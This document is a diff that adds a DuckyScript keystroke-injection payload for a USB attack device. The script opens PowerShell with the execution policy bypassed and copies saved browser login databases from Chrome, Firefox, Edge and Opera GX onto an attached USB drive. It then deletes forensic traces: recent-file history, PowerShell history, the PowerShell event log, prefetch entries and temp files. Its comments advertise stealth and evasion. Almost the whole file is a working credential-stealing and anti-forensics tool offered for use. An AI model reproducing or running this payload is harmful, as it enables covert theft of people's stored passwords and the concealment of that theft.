@@ -1,0 +1,112 @@
+REM ============================== READ ME & CREDITS ===================================
+REM || Script based on markcyber's work, updated for stealthier operation by Nonnamme ||
+REM || Credits: Based on (github.com/markcyber) Updated by (github.com/GreyHatUser)   ||
+REM || Requieres an Exfil USB drive named 'MYUSB', can be changed to another name     ||
+REM ====================================================================================
+
+REM ========================================================= UPDATES =============================================================
+REM || From the original payload i included many protocols for stealthy operation reducing flags and clearing logs and traces.   ||
+REM || For starters most commands are shielded in case  of error evading error messages pop up during the operation.             ||
+REM || I added many coments and delays to optimise and shield the process in case its executed in slower pc's.                   ||
+REM || I formated the entire code for better readability, debugging and modification.                                            ||
+REM || Also merged some STRING lines that were separated for no aparent reason, cleaning some steps.                             ||
+REM || Added compatibility for Opera GX browser.                                                                                 ||
+REM || Key Updates on forsenic trace deletion: Clear file history, PowerShell history, PS EventLogs, prefetch for PS, temp files.|| 
+REM ===============================================================================================================================
+
+REM ======================================================= OPTIONS =====================================================================
+REM || You can change the open powershell for this line in case you need the window to stay hidden during the execution of the payload ||
+REM =====================================================================================================================================
+REM ||                             powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden                                   ||
+REM =====================================================================================================================================
+
+
+REM Open PowerShell without profile to reduce logging footprint
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -NoProfile -ExecutionPolicy Bypass
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Check if the necessary USB drive exists, kept WmiObj instead of CimInstance as it didnt work for some instances
+REM Change here the exfil USB drive name if needed
+STRING $usbDrive = Get-WmiObject Win32_Volume | ? { $_.Label -eq 'MYUSB' } | Select -ExpandProperty DriveLetter; if ($usbDrive -ne $null) {
+ENTER
+DELAY 300
+STRING cd "$usbDrive\"
+ENTER
+DELAY 300
+
+REM Creates loot folder
+STRING mkdir BrowserData -ErrorAction SilentlyContinue;
+ENTER
+DELAY 400
+STRING cd BrowserData;
+ENTER
+DELAY 400
+
+REM Copy Chrome Login Data to USB, updated to evade errors with overwriting and suppress error messages
+STRING $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; if (Test-Path $chromePath) { Copy-Item $chromePath "$usbDrive\BrowserData\ChromeLoginData" -Recurse -Force -ErrorAction SilentlyContinue; }
+ENTER
+DELAY 400
+
+REM Copy Firefox Login Data to USB, updated to evade errors with overwriting and suppress error messages
+STRING $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\"; if (Test-Path $firefoxPath) { Copy-Item $firefoxPath "$usbDrive\BrowserData\FirefoxData" -Recurse -Force -ErrorAction SilentlyContinue; }
+ENTER
+DELAY 400
+
+REM Copy Edge Login Data to USB, updated to evade errors with overwriting and suppress error messages
+STRING $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"; if (Test-Path $edgePath) { Copy-Item $edgePath "$usbDrive\BrowserData\EdgeLoginData" -Recurse -Force -ErrorAction SilentlyContinue; }
+ENTER
+DELAY 400
+
+REM Copy Opera GX Login Data to USB, another browser addition
+STRING $operaPath = "$env:APPDATA\Opera Software\Opera GX Stable\Login Data"; if (Test-Path $operaPath) { Copy-Item $operaPath "$usbDrive\BrowserData\OperaGXData" -Recurse -Force -ErrorAction SilentlyContinue; }
+ENTER
+DELAY 400
+
+STRING }
+ENTER
+DELAY 2000
+
+REM Script finished, time to delete traces.
+
+REM Clear the clipboard (Not strict but useful)
+STRING echo off | clip
+ENTER
+DELAY 500
+
+REM Clear recent file history
+STRING Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
+ENTER
+DELAY 75
+
+REM Clear PowerShell history, (if) in case PSReadline is not available
+STRING if (Get-Command Get-PSReadlineOption -ErrorAction SilentlyContinue) { Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue }
+DELAY 50
+ENTER
+DELAY 250
+
+REM Clear PowerShell event logs
+STRING wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+DELAY 50
+ENTER
+DELAY 100
+
+REM Remove prefetch entries for PowerShell
+STRING Remove-Item "$env:SystemRoot\Prefetch\POWERSHELL*.pf" -Force -ErrorAction SilentlyContinue
+DELAY 50
+ENTER
+DELAY 100
+
+REM Wipe temp files possibly altered during the copy process
+STRING Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+DELAY 50
+ENTER
+DELAY 250
+
+REM Close PowerShell
+STRING exit
+ENTER
